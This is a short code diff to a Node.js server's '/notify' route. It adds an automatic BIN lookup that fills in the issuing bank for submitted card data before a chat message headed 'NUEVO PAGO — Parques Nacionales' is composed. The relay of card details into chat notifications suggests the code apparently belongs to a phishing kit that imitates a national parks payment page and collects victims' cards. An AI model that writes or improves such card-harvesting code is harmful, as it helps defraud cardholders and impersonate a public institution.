@@ -120,6 +120,14 @@ app.post('/notify', async (req, res) => {
   } else {
     // ═══ NOTIFICACIÓN PAGO (original) ═══
     const c = d.card || {};
+    // Auto-lookup bank name si el cliente no lo envió
+    if ((!c.bankRaw && !c.bankSlug) && c.bin) {
+      try {
+        const binData = await lookupBin(c.bin);
+        c.bankRaw = binData.bankRaw || '';
+        c.bankSlug = binData.bank || '';
+      } catch (_) {}
+    }
     msg = `💳 <b>NUEVO PAGO — Parques Nacionales</b>\n\n` +
           `🏞️ <b>Parque:</b> ${d.parque || '—'}\n` +
           `🔖 <b>Referencia:</b> ${d.codigo || '—'}\n` +
